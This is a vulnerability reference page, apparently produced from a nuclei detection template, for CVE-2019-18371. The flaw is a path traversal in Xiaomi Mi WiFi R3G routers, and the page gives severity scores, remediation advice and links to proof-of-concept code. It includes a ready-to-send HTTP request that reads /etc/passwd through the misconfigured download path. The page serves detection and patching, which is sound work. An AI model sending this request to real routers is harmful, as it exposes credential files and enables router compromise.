---
layout: post
cve_id: CVE-2019-18371
title: Xiaomi Mi WiFi R3G Routers - Local file Inclusion
pcap: true
pcap_path: /pcaps/2019/CVE-2019-18371.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-18371.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Unauthenticated attackers can bypass authentication and read arbitrary files
  including configuration files containing credentials, potentially leading to complete
  router compromise.

  '
remediation: 'Update the firmware of the Xiaomi Mi WiFi R3G routers to the latest
  version, which includes a fix for the local file inclusion vulnerability.

  '
reference:
- https://ultramangaia.github.io/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html
- https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/arbitrary_file_read_vulnerability.py
- https://nvd.nist.gov/vuln/detail/CVE-2019-18371
- https://github.com/password520/Penetration_PoC
- https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2019-18371
  cwe-id: CWE-22
  epss-score: 0.91982
  epss-percentile: 0.99682
  cpe: cpe:2.3:o:mi:millet_router_3g_firmware:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: mi
  product: millet_router_3g_firmware
tags:
- cve2019
- cve
- lfi
- router
- mi
- xiaomi
- vkev
- vuln
---

## üîç Vulnerability Description
Xiaomi Mi WiFi R3G devices before 2.28.23-stable are susceptible to local file inclusion vulnerabilities via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.


## üåê HTTP Request
```nohighlight
GET /api-third-party/download/extdisks../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

